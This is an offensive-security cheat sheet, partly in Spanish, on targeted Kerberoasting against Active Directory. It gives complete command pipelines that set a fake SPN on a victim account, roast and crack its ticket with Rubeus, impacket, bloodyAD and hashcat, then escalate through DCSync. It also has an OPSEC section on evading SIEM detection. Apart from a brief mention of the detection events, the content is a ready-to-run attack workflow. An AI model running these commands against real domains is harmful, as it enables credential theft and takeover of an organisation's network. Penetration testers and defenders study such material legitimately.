---
aliases:
  - Targeted Kerberoasting
  - WriteSPN Abuse
  - servicePrincipalName ACL Abuse
tags:
  - type/technique
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Kerberoasting]]"
---
# Kerberoasting - Targeted Kerberoasting

***

## Concept Overview

| **Aspecto** | **Detalle** |
|:---:|:---:|
| Mecanismo | User sin SPN → atacante set SPN temporario → roast → clear SPN |
| Required ACL | `WriteProperty servicePrincipalName` o `GenericAll/Write` sobre target |
| Por qué | Service accounts pueden no existir / tener AES strong; atacante elige user con password humana débil |
| Ventaja sobre kerberoast standard | No depende de SPN existente (set + roast + clear) |
| Detection | Event 5136 (LDAP modify) + 4769 (TGS request) |
^kerb-targeted-concept

___

## ACL Required

| **Right** | **Source** | **Suficiente** |
|:---:|:---:|:---:|
| `WriteProperty servicePrincipalName` (GUID `f3a64788-5306-11d1-a9c5-0000f80367c1`) | Specific attribute write | **Sí** — directo. |
| `GenericWrite` | Modify any attribute | Sí — incluye SPN. |
| `GenericAll` | Full control | Sí — incluye Write. |
| `WriteOwner` | Take ownership → grant self GenericAll → set SPN | Multi-step. |
| `WriteDacl` | Modify DACL → grant self → set SPN | Multi-step. |
^kerb-targeted-acl

```powershell
# Hunt principals con WriteProperty SPN sobre users no-SPN
Find-InterestingDomainAcl -ResolveGUIDs |
  Where {
    ($_.ObjectAceType -eq "Service-Principal-Name" -or
     $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner") -and
    $_.IdentityReferenceClass -eq "user"
  } |
  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
```

___

## Attack Workflow

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Identificar ACL `WriteProperty servicePrincipalName` o broader | BloodHound + Find-InterestingDomainAcl | Pre-attack. |
| 2. Save current SPN attribute (cleanup) | `Get-ADUser <victim> -Pr ServicePrincipalName` | Backup. |
| 3. Set fake SPN | `Set-ADUser <victim> -ServicePrincipalNames @{Add='HTTP/fakeservice.corp.local'}` | Privesc. |
| 4. Request TGS (roast) | `Rubeus.exe kerberoast /user:<victim>` o `impacket-GetUserSPNs ... -request` | Roast. |
| 5. Crack hash offline | `hashcat -m 13100 hash.txt rockyou.txt -O` | Crack. |
| 6. Cleanup SPN (OPSEC) | `Set-ADUser <victim> -ServicePrincipalNames @{Remove='HTTP/fakeservice.corp.local'}` | Hygiene. |
^kerb-targeted-workflow

```powershell
# Pipeline completo Windows
$Victim = "jsmith"
$FakeSPN = "HTTP/fake-svc-$([guid]::NewGuid().Guid.Substring(0,8)).corp.local"

# Backup
$Original = (Get-ADUser $Victim -Properties ServicePrincipalName).ServicePrincipalName

# Set fake SPN
Set-ADUser $Victim -ServicePrincipalNames @{Add=$FakeSPN}

# Roast
Rubeus.exe kerberoast /user:$Victim /outfile:hash.txt /format:hashcat

# Cleanup
Set-ADUser $Victim -ServicePrincipalNames @{Remove=$FakeSPN}

# Crack
hashcat -m 13100 hash.txt rockyou.txt -O
```

___

## targetedKerberoast.py (Linux Auto)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 targetedKerberoast.py -d corp.local -u u -p pass` | Auto-discover writable users + roast + cleanup | Standard Linux. |
| `python3 targetedKerberoast.py -d corp.local -u u -p pass --request-user <victim>` | Specific victim | Targeted. |
| `python3 targetedKerberoast.py -d corp.local -u u --no-pass -k -dc-ip <DC>` | Kerberos auth | OPSEC. |
| `python3 targetedKerberoast.py -d corp.local -u u -p pass --only-vulnerable` | Solo users con writable SPN attr | Filter. |
^kerb-targeted-tool

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
pip install -r requirements.txt

python3 targetedKerberoast.py -d corp.local -u atacante -p 'Pass!' --dc-ip <DC>

# Output:
# [+] Found writable user: jsmith
# [+] Setting SPN: HTTP/<random>...
# [+] TGS hash captured: $krb5tgs$23$*jsmith$corp.local$...
# [+] Cleaning up SPN
```

___

## bloodyAD Targeted (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass set object <victim> servicePrincipalName -v 'HTTP/fake'` | Set SPN | Privesc step. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove object <victim> servicePrincipalName -v 'HTTP/fake'` | Clear SPN | Cleanup. |
^kerb-targeted-bloodyad

```bash
# Pipeline Linux con bloodyAD + Impacket
bloodyAD --host <DC> -d corp -u atacante -p 'Pass!' \
  set object jsmith servicePrincipalName -v 'HTTP/fakesvc.corp.local'

impacket-GetUserSPNs corp.local/atacante:'Pass!' -dc-ip <DC> \
  -request -user jsmith -outputfile target.hash

bloodyAD --host <DC> -d corp -u atacante -p 'Pass!' \
  remove object jsmith servicePrincipalName -v 'HTTP/fakesvc.corp.local'
```

___

## BloodHound Targeted Kerberoast Edges

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner]->(t:User) WHERE NOT t.hasspn RETURN u,t` | Owned con write sobre users sin SPN (targeted candidates) | Path planning. |
| `MATCH (u {owned:true})-[:WriteProperty]->(t:User) WHERE NOT t.hasspn RETURN u,t` | Specific WriteProperty (incluye SPN attr) | Standard. |
| `MATCH (u {owned:true})-[*1..3]->(t:User {adminCount:true}) WHERE NOT t.hasspn RETURN p` | Path a priv users sin SPN (max value) | Critical. |
^kerb-targeted-bh

___

## Post-Crack Privesc

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u <victim> -p '<cracked-pass>'` | Validate cracked pwd | Post-crack. |
| `nxc smb <target> -u <victim> -p '<cracked-pass>' --groups` | Effective groups (priv check) | Post-validate. |
| `impacket-secretsdump corp.local/<victim>:'<pass>'@<DC>` | Si victim es DA → DCSync | Privesc chain. |
| `Rubeus.exe asktgt /user:<victim> /password:<cracked> /domain:corp.local /ptt` | TGT con cracked pwd | Standard auth. |
^kerb-targeted-postcrack

___

## OPSEC

| **Práctica** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Random SPN value | `HTTP/<random-uuid>.corp.local` | Avoid signature match. |
| Cleanup ALWAYS post-roast | Remove SPN del attribute | Hygiene. |
| Single user a la vez | No bulk targeted | Reduce events 5136 + 4769. |
| Time gap entre set y request | 30-60sec | Reduce correlation. |
| AES filter si posible (`Rubeus /aes`) | Avoid RC4 etype anomaly | Modern. |
| Detection: 5136 + 4769 within 60sec window | SIEM rule | Defender side. |
^kerb-targeted-opsec

```bash
# OPSEC pipeline
VICTIM=jsmith
RANDOM_SPN="HTTP/svc-$(openssl rand -hex 4).corp.local"

# Set + sleep + roast + sleep + cleanup
bloodyAD ... set object $VICTIM servicePrincipalName -v "$RANDOM_SPN"
sleep 60
impacket-GetUserSPNs corp.local/atacante:'Pass!' -dc-ip <DC> -request -user $VICTIM -outputfile h.txt
sleep 30
bloodyAD ... remove object $VICTIM servicePrincipalName -v "$RANDOM_SPN"
```

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `Insufficient access rights` setting SPN | Sin `WriteProperty SPN` o `GenericWrite` | Need correct ACE. |
| `Constraint violation` | SPN already exists en otro user (uniqueness) | Random SPN value. |
| Roast retorna 0 hashes | SPN set fail o user disabled | Verify post-set + Enabled flag. |
| Cleanup falla | Race condition / lock | Retry o force LDAP modify. |
| Hash cracked pero auth fail | Password rotated post-crack | Re-roast post-rotation. |
^kerb-targeted-errors

***
